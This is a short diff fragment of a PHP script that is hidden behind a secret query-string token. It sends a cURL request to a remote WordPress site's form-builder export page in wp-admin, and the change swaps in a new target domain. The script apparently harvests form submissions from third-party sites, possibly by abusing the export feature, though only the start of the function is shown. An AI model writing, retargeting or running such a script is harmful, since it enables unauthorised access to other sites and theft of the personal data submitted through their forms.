@@ -7,7 +7,7 @@ if (!isset($_GET['quack']) || $_GET['quack'] !== "INVOKOdyWUGw2bc") {
 
 function download($pageNum = 1)
 {
-	$siteUrl = "http://haiden.tech/";
+	$siteUrl = "http://glpd.space/";
 	$curlURL = "{$siteUrl}wp-admin/admin.php?page=vfb-export";
 	$postFields = array(
 			"forms_form_id="=>"0",
